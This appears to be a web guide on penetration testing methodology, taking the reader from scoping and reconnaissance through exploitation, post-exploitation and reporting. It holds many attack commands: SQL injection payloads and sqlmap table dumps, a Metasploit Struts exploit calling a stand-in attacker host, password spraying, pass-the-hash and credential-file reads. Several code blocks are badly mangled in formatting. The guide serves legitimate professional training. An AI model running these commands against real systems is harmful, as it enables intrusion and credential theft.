<div class="container">
    <header>
        <div class="breadcrumb">
            <a href="/">Home</a> / <a href="/guides/">Guides</a> / Penetration Testing Methodology
        </div>
        <h1>Penetration Testing Methodology<span class="new-badge">NEW</span></h1>
        <div class="meta">
            <div class="meta-item">📅 Published: Dec 13, 2025</div>
            <div class="meta-item">⏱️ 22 min read</div>
            <div class="meta-item">🏷️ Advanced</div>
        </div>
    </header>

    <article class="content">
        <img src="/images/guides/penetration-testing-methodology.png"
            alt="Penetration Testing Methodology - Ethical Hacking Guide" class="featured-image" loading="lazy">

        <p>Penetration testing is both an art and a science. I've been conducting pentests for years, and what I've
            learned is that <strong>methodology matters more than tools</strong>. Anyone can run a vulnerability
            scanner. What separates a good pentester from a script kiddie is the ability to think like an
            attacker—to chain vulnerabilities, understand business context, and find what automated tools miss.</p>

        <p>This guide covers the complete penetration testing methodology, from initial scoping through final
            reporting. Whether you're preparing for a certification, starting a career in offensive security, or
            looking to understand what pentesters do so you can better defend, this is for you.</p>

        <div class="callout">
            <strong><i class="fas fa-exclamation-triangle" style="color: var(--accent-orange);"></i> Legal
                Disclaimer:</strong> Penetration testing without explicit written authorization is
            illegal. Always obtain proper authorization (scope document, rules of engagement) before testing any
            systems. This guide is for educational purposes and authorized security testing only.
        </div>

        <h2>The Penetration Testing Phases</h2>

        <div class="phase-timeline">
            <div class="phase-item">
                <div class="phase-number">1</div>
                <div class="phase-name">Planning & Recon</div>
            </div>
            <div class="phase-item">
                <div class="phase-number">2</div>
                <div class="phase-name">Scanning</div>
            </div>
            <div class="phase-item">
                <div class="phase-number">3</div>
                <div class="phase-name">Exploitation</div>
            </div>
            <div class="phase-item">
                <div class="phase-number">4</div>
                <div class="phase-name">Post-Exploitation</div>
            </div>
            <div class="phase-item">
                <div class="phase-number">5</div>
                <div class="phase-name">Reporting</div>
            </div>
        </div>

        <h2>Phase 1: Planning & Reconnaissance</h2>

        <p>The first phase is the most important. A pentest without proper planning is just hacking. Reconnaissance
            (recon) is where you gather intelligence about your target—the more you know, the more effective your
            attacks.</p>

        <h3>Pre-Engagement: Rules of Engagement</h3>
        <p>Before any testing begins, establish:</p>
        <ul>
            <li><strong>Scope:</strong> What's in scope? (IP ranges, domains, applications)</li>
            <li><strong>Rules:</strong> What's off-limits? (production systems, specific hours)</li>
            <li><strong>Authorization:</strong> Written permission signed by appropriate authority</li>
            <li><strong>Timeline:</strong> Start/end dates, reporting deadlines</li>
            <li><strong>Communication:</strong> Emergency contacts, status update frequency</li>
            <li><strong>Test Type:</strong> Black box, gray box, or white box?</li>
        </ul>

        <div class="callout info">
            <strong>Test Types Explained:</strong>
            <ul>
                <li><strong>Black Box:</strong> Zero prior knowledge—simulates external attacker</li>
                <li><strong>Gray Box:</strong> Some knowledge (credentials, architecture)—most realistic</li>
                <li><strong>White Box:</strong> Full access to source code, designs—thorough but time-intensive</li>
            </ul>
        </div>

        <h3>Passive Reconnaissance</h3>
        <p>Gather information without directly touching the target:</p>

        <h4>OSINT Sources:</h4>
        <ul>
            <li><strong>DNS Records:</strong> Subdomains, mail servers, name servers</li>
            <li><strong>WHOIS:</strong> Domain registration, contact info, registrar</li>
            <li><strong>Google Dorking:</strong> <code>site:target.com filetype:pdf</code></li>
            <li><strong>Shodan/Censys:</strong> Internet-facing services, banners, certificates</li>
            <li><strong>Social Media:</strong> Employee info, tech stack hints, leaked credentials</li>
            <li><strong>GitHub:</strong> Exposed secrets, internal code, API keys</li>
            <li><strong>Wayback Machine:</strong> Historical site versions, removed pages</li>
        </ul>

        <div class="tool-box">
            <h5>🛠️ Passive Recon Tools</h5>
            <div class="tool-list">
                <span class="tool-tag">theHarvester</span>
                <span class="tool-tag">Amass</span>
                <span class="tool-tag">Shodan</span>
                <span class="tool-tag">Maltego</span>
                <span class="tool-tag">Recon-ng</span>
                <span class="tool-tag">SpiderFoot</span>
            </div>
        </div>

        <pre><code># Subdomain Enumeration with Amass

amass enum -d target.com -o subdomains.txt

theHarvester - OSINT gathering

theHarvester -d target.com -b all -l 500

Google Dorks Examples

site:target.com filetype:sql site:target.com inurl:admin site:target.com “password” filetype:txt site:github.com “target.com” password

        <h3>Active Reconnaissance</h3>
        <p>Direct interaction with target systems (may be detected):</p>

        <pre><code># DNS Enumeration

dig target.com ANY dig axfr @ns1.target.com target.com # Zone transfer attempt

Subdomain Brute Force

gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

Web Technology Fingerprinting

whatweb https://target.com wappalyzer (browser extension)

        <h2>Phase 2: Scanning & Enumeration</h2>

        <p>Now we actively probe the target to discover services, versions, and potential vulnerabilities. This is
            where we move from "who are they" to "what are they running."</p>

        <h3>Network Scanning</h3>

        <h4>Port Scanning with Nmap:</h4>
        <pre><code># Quick scan - top 1000 ports

nmap -sV -sC -oA scan_results target.com

Full TCP scan - all 65535 ports

nmap -p- -sV -sC -oA full_scan target.com

UDP scan (slower, often forgotten)

nmap -sU –top-ports 100 target.com

Aggressive scan with OS detection

nmap -A -T4 target.com

Stealth scan (SYN scan)

nmap -sS -Pn target.com

        <p><strong>Critical ports to look for:</strong></p>
        <ul>
            <li><strong>21 (FTP):</strong> Anonymous access? Outdated version?</li>
            <li><strong>22 (SSH):</strong> Version, auth methods, weak keys</li>
            <li><strong>23 (Telnet):</strong> Cleartext credentials—always a finding</li>
            <li><strong>25/587 (SMTP):</strong> Open relay? User enumeration?</li>
            <li><strong>80/443 (HTTP/S):</strong> Web applications—biggest attack surface</li>
            <li><strong>445 (SMB):</strong> EternalBlue? Null sessions?</li>
            <li><strong>3389 (RDP):</strong> BlueKeep? Weak credentials?</li>
            <li><strong>3306/5432 (MySQL/PostgreSQL):</strong> Exposed databases?</li>
        </ul>

        <div class="tool-box">
            <h5>🛠️ Scanning Tools</h5>
            <div class="tool-list">
                <span class="tool-tag">Nmap</span>
                <span class="tool-tag">Masscan</span>
                <span class="tool-tag">RustScan</span>
                <span class="tool-tag">Netcat</span>
                <span class="tool-tag">Nikto</span>
            </div>
        </div>

        <h3>Web Application Scanning</h3>

        <p>Web apps are where most vulnerabilities live. Focus here.</p>

        <h4>Directory & File Enumeration:</h4>
        <pre><code># Gobuster - directory brute forcing

gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

Feroxbuster (faster, recursive)

feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

FFUF - fuzzing tool

ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302

        <h4>Vulnerability Scanning:</h4>
        <pre><code># Nikto - web vulnerabilities

nikto -h https://target.com

Nuclei - template-based scanner

nuclei -u https://target.com -t cves/ -t vulnerabilities/

WPScan - WordPress specific

wpscan –url https://target.com –enumerate p,u

        <h3>Service Enumeration</h3>

        <h4>SMB Enumeration (Windows):</h4>
        <pre><code># Enum4linux

enum4linux -a target.com

SMBClient - list shares

smbclient -L //target.com -N

CrackMapExec - swiss army knife

crackmapexec smb target.com -u ‘’ -p ‘’ –shares

        <h4>LDAP/Active Directory:</h4>
        <pre><code># LDAP anonymous bind

ldapsearch -x -H ldap://target.com -b “DC=target,DC=com”

BloodHound collection (with creds)

bloodhound-python -u user -p pass -d target.com -c All

        <h2>Phase 3: Exploitation</h2>

        <p>This is where we attempt to gain access. The key is to <strong>prioritize</strong>—attack the most
            likely-to-succeed vectors first.</p>

        <h3>Attack Prioritization</h3>
        <ol>
            <li><strong>Default/Weak Credentials:</strong> admin:admin, root:root, etc.</li>
            <li><strong>Known CVEs:</strong> Unpatched vulnerabilities with public exploits</li>
            <li><strong>Misconfigurations:</strong> Open shares, anonymous access, exposed admin panels</li>
            <li><strong>Web Application Flaws:</strong> SQLi, RCE, SSRF, auth bypass</li>
            <li><strong>Password Attacks:</strong> Brute force, spray, credential stuffing</li>
        </ol>

        <h3>Common Exploitation Techniques</h3>

        <h4>SQL Injection:</h4>
        <pre><code># Manual testing

’ OR ‘1’=’1 ’ UNION SELECT null,null,null– ’ AND 1=CONVERT(int,@@version)–

SQLMap automated exploitation

sqlmap -u “https://target.com/page?id=1” –dbs sqlmap -u “https://target.com/page?id=1” -D dbname –tables sqlmap -u “https://target.com/page?id=1” -D dbname -T users –dump

        <h4>Remote Code Execution:</h4>
        <pre><code># Metasploit Framework

msfconsole use exploit/multi/http/apache_struts_rce set RHOSTS target.com set LHOST attacker[.]com exploit

Manual exploitation

Find the CVE, find the PoC, modify for your target

        <h4>Password Attacks:</h4>
        <pre><code># Password Spraying (avoid lockouts!)

crackmapexec smb target.com -u users.txt -p ‘Summer2025!’ –continue-on-success

Hydra brute force

hydra -l admin -P rockyou.txt target.com ssh

Hashcat offline cracking

hashcat -m 1000 ntlm_hashes.txt rockyou.txt

        <div class="callout warning">
            <strong><i class="fas fa-exclamation-triangle" style="color: var(--accent-orange);"></i> Account Lockout
                Warning:</strong> Always check password policies before brute forcing. A good
            rule: 1 password per 30 minutes per account to avoid lockouts.
        </div>

        <div class="tool-box">
            <h5>🛠️ Exploitation Tools</h5>
            <div class="tool-list">
                <span class="tool-tag">Metasploit</span>
                <span class="tool-tag">SQLMap</span>
                <span class="tool-tag">Burp Suite</span>
                <span class="tool-tag">CrackMapExec</span>
                <span class="tool-tag">Hydra</span>
                <span class="tool-tag">Hashcat</span>
                <span class="tool-tag">Impacket</span>
            </div>
        </div>

        <h2>Phase 4: Post-Exploitation</h2>

        <p>You've gained access. Now what? Post-exploitation is about <strong>demonstrating impact</strong>—proving
            what an attacker could do with this access.</p>

        <h3>Privilege Escalation</h3>

        <h4>Linux Privilege Escalation:</h4>
        <pre><code># Automated enumeration

./linpeas.sh ./linux-smart-enumeration.sh

Manual checks

sudo -l # What can I sudo? find / -perm -4000 2>/dev/null # SUID binaries cat /etc/crontab # Cron jobs ls -la /etc/passwd /etc/shadow # File permissions

Common escalation paths:

- Misconfigured sudo

- Writable cron jobs

- SUID binaries (GTFOBins)

- Kernel exploits (DirtyPipe, etc.)

        <h4>Windows Privilege Escalation:</h4>
        <pre><code># Automated enumeration

.\winPEAS.exe .\PowerUp.ps1; Invoke-AllChecks

Manual checks

whoami /priv # Token privileges net localgroup administrators # Local admins reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # AlwaysInstallElevated

Common escalation paths:

- Unquoted service paths

- Weak service permissions

- AlwaysInstallElevated

- Token impersonation (Potato attacks)

- Cached credentials

        <h3>Lateral Movement</h3>
        <p>Move from one compromised system to others:</p>

        <pre><code># Pass-the-Hash

crackmapexec smb 10.0.0.0/24 -u admin -H ‘aad3b435b51404eeaad3b435b51404ee:hash’

WMI Exec

impacket-wmiexec admin:password@target.com

PSExec

impacket-psexec admin:password@target.com

Evil-WinRM (Windows Remote Management)

evil-winrm -i target.com -u admin -p password

        <h3>Data Exfiltration (Proof of Concept)</h3>
        <p>Demonstrate what sensitive data you can access:</p>
        <ul>
            <li><strong>Credentials:</strong> SAM database, LSA secrets, cached creds</li>
            <li><strong>Sensitive Files:</strong> Config files, databases, PII</li>
            <li><strong>Active Directory:</strong> Domain controller access, KRBTGT hash</li>
        </ul>

        <div class="callout info">
            <strong>Ethical Note:</strong> In a real pentest, you demonstrate access—you don't actually exfiltrate
            customer data. Take screenshots, document paths, and stop there.
        </div>

        <h2>Phase 5: Reporting</h2>

        <p>The report is the deliverable. A pentest without a good report is worthless. Your report should be
            <strong>actionable</strong>—the client should know exactly what to fix.
        </p>

        <h3>Report Structure</h3>
        <ol>
            <li><strong>Executive Summary:</strong> High-level overview for management (1-2 pages)</li>
            <li><strong>Methodology:</strong> What you tested and how</li>
            <li><strong>Findings Summary:</strong> Table of vulnerabilities by severity</li>
            <li><strong>Detailed Findings:</strong> Each vulnerability with:
                <ul>
                    <li>Description</li>
                    <li>Risk rating (CVSS or custom)</li>
                    <li>Affected systems</li>
                    <li>Evidence (screenshots, logs)</li>
                    <li>Remediation steps</li>
                </ul>
            </li>
            <li><strong>Appendices:</strong> Raw scan results, wordlists used, timeline</li>
        </ol>

        <h3>Sample Finding Format:</h3>
        <div class="callout" style="border-left-color: var(--accent-red);">
            <strong>Finding: SQL Injection in Login Form</strong><br><br>
            <strong>Severity:</strong> Critical (CVSS 9.8)<br>
            <strong>Affected:</strong> https://target.com/login<br><br>
            <strong>Description:</strong> The login form is vulnerable to SQL injection, allowing an attacker to
            bypass authentication and extract database contents including user credentials.<br><br>
            <strong>Evidence:</strong> [Screenshot of SQLMap extracting users table]<br><br>
            <strong>Recommendation:</strong> Use parameterized queries or prepared statements. Input validation
            alone is insufficient.
        </div>

        <h2>Essential Pentesting Tools</h2>

        <p>Here's my personal toolkit organized by phase:</p>

        <table style="width:100%; border-collapse: collapse; margin: 1.5rem 0;">
            <tr style="background: var(--bg-card);">
                <th style="padding: 1rem; border: 1px solid var(--border); color: var(--accent-cyan);">Phase</th>
                <th style="padding: 1rem; border: 1px solid var(--border); color: var(--accent-cyan);">Tools</th>
            </tr>
            <tr style="border: 1px solid var(--border);">
                <td style="padding: 1rem; border: 1px solid var(--border);">Recon</td>
                <td style="padding: 1rem; border: 1px solid var(--border);">Amass, theHarvester, Shodan, Maltego
                </td>
            </tr>
            <tr style="background: var(--bg-card); border: 1px solid var(--border);">
                <td style="padding: 1rem; border: 1px solid var(--border);">Scanning</td>
                <td style="padding: 1rem; border: 1px solid var(--border);">Nmap, Masscan, Nuclei, Burp Suite</td>
            </tr>
            <tr style="border: 1px solid var(--border);">
                <td style="padding: 1rem; border: 1px solid var(--border);">Web</td>
                <td style="padding: 1rem; border: 1px solid var(--border);">Burp Suite, OWASP ZAP, SQLMap, Gobuster
                </td>
            </tr>
            <tr style="background: var(--bg-card); border: 1px solid var(--border);">
                <td style="padding: 1rem; border: 1px solid var(--border);">Exploitation</td>

            </tr>

        <h2>My Personal Pentesting Tips</h2>

        <p>After years of pentesting, here's what I wish someone had told me earlier:</p>

        <div class="callout success">
            <strong><i class="fas fa-lightbulb" style="color: var(--accent-cyan);"></i> Pro Tips:</strong>
            <ol>
                <li><strong>Document everything</strong> - You will forget what you did. Screenshots, notes,
                    timestamps.</li>
                <li><strong>Manual > Automated</strong> - Scanners miss things. Always do manual testing.</li>
                <li><strong>Think business impact</strong> - "I got SQL injection" is less impactful than "I
                    extracted 1M customer records."</li>
                <li><strong>Check default credentials FIRST</strong> - You'd be surprised how often this works.</li>
                <li><strong>Don't break things</strong> - A crashed production server ends the engagement.</li>
                <li><strong>Know when to stop</strong> - Domain admin in 2 hours? Stop, document, report.</li>
                <li><strong>Read error messages</strong> - They often leak valuable information.</li>
                <li><strong>Build relationships</strong> - The defensive team isn't your enemy.</li>
            </ol>
        </div>

        <h2>Certifications & Learning Path</h2>

        <p>Want to pursue pentesting professionally? Here's a recommended path:</p>

        <ul>
            <li><strong>Beginner:</strong> CompTIA Security+, eJPT (eLearnSecurity Junior PT)</li>
            <li><strong>Intermediate:</strong> CEH, CompTIA PenTest+, PNPT (Practical Network PT)</li>
            <li><strong>Advanced:</strong> OSCP (Offensive Security Certified Professional)</li>
            <li><strong>Expert:</strong> OSCE3, OSEP, CRTO (Certified Red Team Operator)</li>
        </ul>

        <p><strong>Practice Platforms:</strong></p>
        <ul>
            <li>Hack The Box</li>
            <li>TryHackMe</li>
            <li>VulnHub</li>
            <li>PortSwigger Web Security Academy</li>
        </ul>

        <h2>Conclusion</h2>

        <p>Penetration testing is a continuous learning journey. The tools change, the vulnerabilities evolve, but
            the methodology remains constant: <strong>plan, discover, exploit, prove impact, report</strong>.</p>

        <p>The best pentesters I know aren't just technically skilled—they're curious, persistent, and think
            creatively. They ask "what if?" and don't stop at the first roadblock.</p>

        <p><strong>Go break things (legally), and help make the digital world a little more secure.</strong></p>
